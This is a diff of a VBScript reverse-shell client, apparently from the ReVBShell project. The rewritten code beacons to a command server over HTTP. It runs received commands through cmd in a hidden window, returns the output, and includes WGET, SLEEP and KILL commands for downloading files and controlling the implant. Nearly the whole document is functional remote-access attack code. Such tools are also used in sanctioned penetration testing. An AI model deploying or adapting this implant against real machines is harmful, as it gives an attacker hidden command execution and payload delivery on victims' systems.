@@ -1,4 +1,4 @@
-' This software is provided under under the BSD 3-Clause License.
+' this software is provided under under the bsd 3-clause license.
 ' See the accompanying LICENSE file for more information.
 '
 ' Client for Reverse VBS Shell
@@ -10,57 +10,102 @@
 '  https://github.com/bitsadmin/ReVBShell
 '
 
-strHost = "127.0.0.1"
-strPort = "8080"
-
-Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
-Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
-Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
-Const HTTPREQUEST_PROXYSETTING_PROXY = 2
-Dim http, strResponse, strCommand, strArgument, varByteArray, strData, strBuffer, lngCounter, fs, ts
-Set WshShell = CreateObject("WScript.Shell")
-Set fso  = CreateObject("Scripting.FileSystemObject")
-Err.Clear
-
-' Create HTTP object
-Set http = Nothing
+Dim arrResponseText, strRawCommand, strCommand, strArgument, strOutFile, strResponse, strPostResponse
+Set shell = CreateObject("WScript.Shell")
+Set fs  = CreateObject("Scripting.FileSystemObject")
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
 
-' Busy waiting loop
+' Configuration
+strHost = "127.0.0.1"
+strPort = "8080"
+intSleep = 5000
+strUrl = "http://" & strHost & ":" & strPort
+
+' Periodically poll for commands
 While True
     ' Fetch next command
-    http.Open "GET", "http://" & strHost & ":" & strPort & "/cmd", False
+    http.Open "GET", strUrl & "/", False
     http.Send
-    strResponse = Split(http.ResponseText, vbCrLf)
+    strRawCommand = http.ResponseText
+    arrResponseText = Split(strRawCommand, " ", 2)
 
     ' Determine command and arguments
-    strCommand = strResponse(0)
+    strCommand = arrResponseText(0)
     strArgument = ""
-    If UBound(strResponse) > 0 Then
-        strArgument = strResponse(1)
+    If UBound(arrResponseText) > 0 Then
+        strArgument = arrResponseText(1)
     End If
 
-    ' Execute action
-    Select Case strCommand
-        Case "NOOP"
-            ' Sleep 5 seconds
-            WScript.Sleep 5000
-        Case "CMD"
-            'Wscript.echo "CMD: " & strCommand & vbCrLf & "ARGS: " & strArgument
+    strResponse = ""
 
-            ' Execute command
-            WshShell.Run "cmd /C " & strArgument & "> %tmp%\rso.txt 2>&1", 0, true
-            Set file = fso.OpenTextFile(fso.GetSpecialFolder(2) & "\rso.txt", 1)
+    ' Execute command
+    Select Case strCommand
+        ' Sleep X seconds
+        Case "NOOP"
+            WScript.Sleep intSleep
+        
+        ' Set sleep time
+        Case "SLEEP"
+            intSleep = CInt(strArgument)
+            strResponse = "Sleep set to " & strArgument & "ms"
+        
+        ' Execute command
+        Case "SHELL"
+            'Execute and write to file
+            strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
+            shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True
+
+            ' Read out file
+            Set file = fs.OpenTextFile(strOutfile, 1)
             text = file.ReadAll
             file.Close
+            fs.DeleteFile strOutFile, True
 
-            ' POST result back
-            http.Open "POST", "http://" & strHost & ":" & strPort & "/cmd", False
-            http.Send "result=" & text
+            ' Set response
+            strResponse = "--------------------------------------------------" & vbCrLf & text & "--------------------------------------------------"
+
+        ' Download a file from a URL
+        Case "WGET"
+            ' Determine filename
+            arrSplitUrl = Split(strArgument, "/")
+            strFilename = arrSplitUrl(UBound(arrSplitUrl))
+
+            ' Fetch file
+            http.Open "GET", strArgument, False
+            http.Send
+
+            ' Write to file
+            varByteArray = http.ResponseBody
+            Set ts = fs.CreateTextFile(strFilename, True)
+            strData = ""
+            strBuffer = ""
+            For lngCounter = 0 to UBound(varByteArray)
+                ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter + 1, 1)))
+            Next
+            ts.Close
+
+            ' Set response
+            strResponse = "File download successful."
+
+        Case "KILL"
+            strResponse = "Goodbye!"
+
         Case Else
-            Wscript.echo "Unknown command: " & strCommand
+            strResponse = "Unknown command"
     End Select
+
+    ' POST results (if any) back
+    If strResponse <> "" Then
+        strPostResponse = vbCrLf & "> " & strRawCommand & vbCrLf & strResponse & vbCrLf
+        http.Open "POST", strUrl & "/", False
+        http.Send "result=" & strPostResponse
+    End If
+
+    ' Quit on KILL
+    If strCommand = "KILL" Then
+        WScript.Quit 0
+    End If
 Wend
